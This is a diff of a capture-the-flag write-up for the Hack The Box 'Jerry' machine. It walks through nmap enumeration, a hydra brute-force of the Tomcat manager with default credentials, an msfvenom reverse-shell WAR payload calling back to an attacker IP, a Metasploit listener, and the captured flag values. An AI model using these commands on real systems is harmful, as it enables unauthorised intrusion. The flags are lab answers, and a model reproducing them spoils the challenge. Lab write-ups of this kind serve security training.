@@ -28,7 +28,7 @@ _Difficulty: Easy_
 The first step in tackling the Jerry machine was performing an nmap scan to enumerate open ports and services:
 
 ```bash
-nmap -sC -sV -A -Pn -oN jerry.nmap 10.10.10.95
+nmap -sC -sV -Pn -oA jerry 10.10.10.95
 ```
 
 ### Findings:
@@ -61,6 +61,8 @@ Initial login attempts with default credentials like `admin:admin` failed. Using
 hydra -C ./Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt http-get://10.10.10.95:8080/manager/html
 ```
 
+![Hydra Screenshot](./Screenshots/hydra_img.png)
+
 **Valid Credentials Found:**
 - **Username:** tomcat
 - **Password:** s3cret
@@ -69,14 +71,17 @@ hydra -C ./Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt http-g
 After logging in, I encountered a file upload section for WAR files. Using msfvenom, I created a WAR payload with a reverse shell:
 
 ```bash
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=9001 -f war -o JerryExploit.war
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.4 LPORT=9001 -f war -o JerryExploit.war
 ```
+![WAR Deployment Screenshot](./Screenshots/WAR_deployment_img.png)
 
 I uploaded the `JerryExploit.war` file and deployed it. Initially, clicking the deployed payload resulted in a 404 error. I then unzipped the WAR file:
 
 ```bash
 unzip JerryExploit.war -d tmp
 ```
+
+![WAR Unzip Screenshot](./Screenshots/WAR_unzip_img.png)
 
 Extracted the JSP file and navigated to:
 
@@ -95,10 +100,10 @@ Using Metasploit, I started a multi/handler listener:
 
 ```bash
 use exploit/multi/handler
-set payload java/jsp_shell_reverse_tcp
-set LHOST 10.10.14.5
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST 10.10.14.4
 set LPORT 9001
-run -j
+exploit -j
 ```
 
 When the JSP file was accessed, it established a Meterpreter session. I confirmed the current user:
@@ -118,6 +123,8 @@ dir
 type "2 for the price of 1.txt"
 ```
 
+![Shell Screenshot](./Screenshots/shell_img.png)
+
 ---
 
 ## **4⃣ Post-Exploitation & Flags 🏁**
@@ -125,6 +132,8 @@ type "2 for the price of 1.txt"
 ### **Flags Found:**
 - **User Flag:** 7004bcsef0f854e0fb401875f26ebd00
 - **Root Flag:** 04a8b36e1545a455393d067e772fe90e
+
+![Flag Screenshot](./Screenshots/flag_img.png)
 
 ---
 
